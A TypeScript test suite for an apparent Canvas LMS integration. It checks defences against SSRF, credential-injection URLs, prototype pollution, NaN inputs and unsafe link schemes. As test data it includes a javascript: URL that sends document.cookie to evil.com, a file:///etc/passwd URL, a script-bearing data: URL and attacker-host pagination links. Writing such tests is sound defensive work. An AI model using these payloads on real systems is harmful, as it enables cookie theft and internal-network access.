import { describe, it, expect, vi, afterEach, beforeEach } from "vitest";
import { validateCanvasUrl, updateClientConfig } from "../src/setup.js";
import { handleToolCall } from "../src/tools/index.js";
import { getAllAssignmentsDue, getCourseAssignmentsDue } from "../src/tools/assignments.js";
import type { CanvasClient } from "../src/canvas-client.js";
import { existsSync, rmSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";

// ---------------------------------------------------------------------------
// validateCanvasUrl
// ---------------------------------------------------------------------------

describe("validateCanvasUrl — rejects invalid inputs", () => {
  it("rejects empty string", () => {
    expect(validateCanvasUrl("")).not.toBeNull();
  });

  it("rejects plain http://", () => {
    expect(validateCanvasUrl("http://canvas.school.edu")).not.toBeNull();
  });

  it("rejects non-URL garbage", () => {
    expect(validateCanvasUrl("not a url at all")).not.toBeNull();
  });

  it("accepts a clean https:// URL", () => {
    expect(validateCanvasUrl("https://canvas.school.edu")).toBeNull();
  });

  it("accepts URL with trailing slash", () => {
    expect(validateCanvasUrl("https://canvas.school.edu/")).toBeNull();
  });
});

describe("validateCanvasUrl — credential injection (Attack: https://user@evil.com)", () => {
  it("rejects URL with username embedded", () => {
    expect(validateCanvasUrl("https://legitschool.edu@evil.com")).not.toBeNull();
  });

  it("rejects URL with user:pass embedded", () => {
    expect(validateCanvasUrl("https://admin:secret@canvas.school.edu")).not.toBeNull();
  });

  it("rejects URL with encoded credential injection", () => {
    expect(validateCanvasUrl("https://canvas.school.edu%2F@evil.com")).not.toBeNull();
  });
});

describe("validateCanvasUrl — SSRF / private IP block (Attack: 169.254.x.x, 10.x.x.x)", () => {
  it("rejects AWS metadata IP", () => {
    expect(validateCanvasUrl("https://169.254.169.254")).not.toBeNull();
  });

  it("rejects loopback", () => {
    expect(validateCanvasUrl("https://127.0.0.1")).not.toBeNull();
  });

  it("rejects localhost hostname", () => {
    // localhost resolves to 127.0.0.1 but the regex checks the literal hostname
    // This is a best-effort check — full DNS resolution is out of scope
    expect(validateCanvasUrl("https://127.0.0.1:8080")).not.toBeNull();
  });

  it("rejects RFC-1918 10.x.x.x", () => {
    expect(validateCanvasUrl("https://10.0.0.1")).not.toBeNull();
  });

  it("rejects RFC-1918 192.168.x.x", () => {
    expect(validateCanvasUrl("https://192.168.1.1")).not.toBeNull();
  });

  it("rejects RFC-1918 172.16.x.x–172.31.x.x", () => {
    expect(validateCanvasUrl("https://172.16.0.1")).not.toBeNull();
    expect(validateCanvasUrl("https://172.31.255.255")).not.toBeNull();
  });

  it("allows a real public Canvas hostname", () => {
    expect(validateCanvasUrl("https://ocean.instructure.com")).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// setup — prototype-key attack (Attack: __proto__ / constructor as client key)
// ---------------------------------------------------------------------------

describe("updateClientConfig — prototype key safety", () => {
  const tmpConfig = join(tmpdir(), `canvas-mcp-proto-test-${Date.now()}.json`);
  afterEach(() => { if (existsSync(tmpConfig)) rmSync(tmpConfig); });

  it("writing canvas entry does not modify Object.prototype", () => {
    const before = ({} as Record<string, unknown>).polluted;
    updateClientConfig(tmpConfig, { command: "npx", args: [] });
    const after = ({} as Record<string, unknown>).polluted;
    expect(before).toBeUndefined();
    expect(after).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// CanvasClient constructor — URL validation
// ---------------------------------------------------------------------------

describe("CanvasClient constructor — URL validation", () => {
  const original = { url: process.env.CANVAS_API_URL, key: process.env.CANVAS_API_KEY };

  afterEach(() => {
    process.env.CANVAS_API_URL = original.url;
    process.env.CANVAS_API_KEY = original.key;
    vi.resetModules();
  });

  async function makeClient() {
    vi.resetModules();
    const { CanvasClient } = await import("../src/canvas-client.js");
    return new CanvasClient();
  }

  it("rejects http:// URL at construction", async () => {
    process.env.CANVAS_API_URL = "http://canvas.school.edu";
    process.env.CANVAS_API_KEY = "token";
    await expect(makeClient()).rejects.toThrow("https://");
  });

  it("rejects URL with embedded credentials at construction", async () => {
    process.env.CANVAS_API_URL = "https://legitschool.edu@evil.com";
    process.env.CANVAS_API_KEY = "token";
    await expect(makeClient()).rejects.toThrow("credentials");
  });

  it("rejects non-URL value at construction", async () => {
    process.env.CANVAS_API_URL = "not-a-url";
    process.env.CANVAS_API_KEY = "token";
    await expect(makeClient()).rejects.toThrow();
  });

  it("accepts a valid https URL", async () => {
    process.env.CANVAS_API_URL = "https://canvas.school.edu";
    process.env.CANVAS_API_KEY = "token";
    await expect(makeClient()).resolves.toBeDefined();
  });
});

// ---------------------------------------------------------------------------
// CanvasClient — SSRF via pagination Link header
// ---------------------------------------------------------------------------

describe("CanvasClient — pagination SSRF (Attack: Link header pointing elsewhere)", () => {
  afterEach(() => vi.restoreAllMocks());

  it("aborts when next pagination URL is on a different host", async () => {
    process.env.CANVAS_API_URL = "https://canvas.school.edu";
    process.env.CANVAS_API_KEY = "token";
    vi.resetModules();
    const { CanvasClient } = await import("../src/canvas-client.js");
    const client = new CanvasClient();

    vi.spyOn(globalThis, "fetch").mockResolvedValueOnce(
      new Response(JSON.stringify([{ id: 1 }]), {
        status: 200,
        headers: { link: '<https://evil.com/steal?page=2>; rel="next"' },
      })
    );

    await expect(client.getCourses()).rejects.toThrow("different host");
  });
});

// ---------------------------------------------------------------------------
// hours_ahead — NaN / non-finite bypass (Attack: NaN slips through clamp)
// ---------------------------------------------------------------------------

describe("handleToolCall — hours_ahead input sanitisation", () => {
  beforeEach(() => {
    process.env.CANVAS_API_URL = "https://canvas.school.edu";
    process.env.CANVAS_API_KEY = "test-token";
    // Return empty courses so the call succeeds without real network
    vi.spyOn(globalThis, "fetch").mockResolvedValue(
      new Response(JSON.stringify([]), { status: 200 })
    );
  });
  afterEach(() => vi.restoreAllMocks());

  it("NaN defaults to 24 hours — does not produce Invalid Date or silent failure", async () => {
    const result = await handleToolCall("get_all_assignments_due", { hours_ahead: NaN });
    expect(result.isError).toBeFalsy();
    expect(result.content[0].text).toContain("24 hours");
  });

  it("Infinity is non-finite so defaults to 24 hours", async () => {
    const result = await handleToolCall("get_all_assignments_due", { hours_ahead: Infinity });
    expect(result.isError).toBeFalsy();
    expect(result.content[0].text).toContain("24 hours");
  });

  it("negative value is clamped to minimum 1", async () => {
    const result = await handleToolCall("get_all_assignments_due", { hours_ahead: -999 });
    expect(result.isError).toBeFalsy();
    expect(result.content[0].text).toContain("1 hour");
  });
});

// ---------------------------------------------------------------------------
// course.id — integer validation (Attack: non-integer id in URL path)
// ---------------------------------------------------------------------------

describe("CanvasClient.getAssignments — courseId validation", () => {
  afterEach(() => vi.restoreAllMocks());

  async function getClient() {
    vi.resetModules();
    process.env.CANVAS_API_URL = "https://canvas.school.edu";
    process.env.CANVAS_API_KEY = "token";
    const { CanvasClient } = await import("../src/canvas-client.js");
    return new CanvasClient();
  }

  it("rejects zero as a course ID", async () => {
    const client = await getClient();
    await expect(client.getAssignments(0)).rejects.toThrow("Invalid course ID");
  });

  it("rejects negative course ID", async () => {
    const client = await getClient();
    await expect(client.getAssignments(-1)).rejects.toThrow("Invalid course ID");
  });

  it("rejects non-integer course ID (path traversal attempt at type level)", async () => {
    const client = await getClient();
    await expect(client.getAssignments(1.5)).rejects.toThrow("Invalid course ID");
  });

  it("accepts a valid positive integer course ID", async () => {
    const client = await getClient();
    vi.spyOn(globalThis, "fetch").mockResolvedValueOnce(
      new Response(JSON.stringify([]), { status: 200 })
    );
    await expect(client.getAssignments(42)).resolves.toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// html_url sanitisation (Attack: javascript:, file://, data: URLs from Canvas)
// ---------------------------------------------------------------------------

describe("assignments — html_url scheme sanitisation", () => {
  function makeMockClientWithUrls(urls: string[]) {
    const now = new Date();
    const inOneHour = new Date(now.getTime() + 60 * 60 * 1000).toISOString();
    return {
      getCourses: vi.fn().mockResolvedValue([
        { id: 1, name: "Test Course", course_code: "TEST101" },
      ]),
      getAssignments: vi.fn().mockResolvedValue(
        urls.map((url, i) => ({
          id: i,
          name: `Assignment ${i}`,
          due_at: inOneHour,
          points_possible: 10,
          html_url: url,
          course_id: 1,
        }))
      ),
    } as unknown as CanvasClient;
  }

  it("strips javascript: URLs — returns empty string", async () => {
    const client = makeMockClientWithUrls([
      "javascript:fetch('https://evil.com?t='+document.cookie)",
    ]);
    const results = await getAllAssignmentsDue(client, 24);
    expect(results[0].url).toBe("");
  });

  it("strips file:// URLs", async () => {
    const client = makeMockClientWithUrls(["file:///etc/passwd"]);
    const results = await getAllAssignmentsDue(client, 24);
    expect(results[0].url).toBe("");
  });

  it("strips data: URLs", async () => {
    const client = makeMockClientWithUrls(["data:text/html,<script>alert(1)</script>"]);
    const results = await getAllAssignmentsDue(client, 24);
    expect(results[0].url).toBe("");
  });

  it("strips vbscript: URLs", async () => {
    const client = makeMockClientWithUrls(["vbscript:msgbox(1)"]);
    const results = await getAllAssignmentsDue(client, 24);
    expect(results[0].url).toBe("");
  });

  it("preserves legitimate https:// assignment URLs", async () => {
    const safeUrl = "https://canvas.school.edu/courses/1/assignments/10";
    const client = makeMockClientWithUrls([safeUrl]);
    const results = await getAllAssignmentsDue(client, 24);
    expect(results[0].url).toBe(safeUrl);
  });

  it("applies same sanitisation in getCourseAssignmentsDue", async () => {
    const client = makeMockClientWithUrls(["javascript:alert(1)"]);
    const results = await getCourseAssignmentsDue(client, "test", 24);
    expect(results[0].url).toBe("");
  });
});
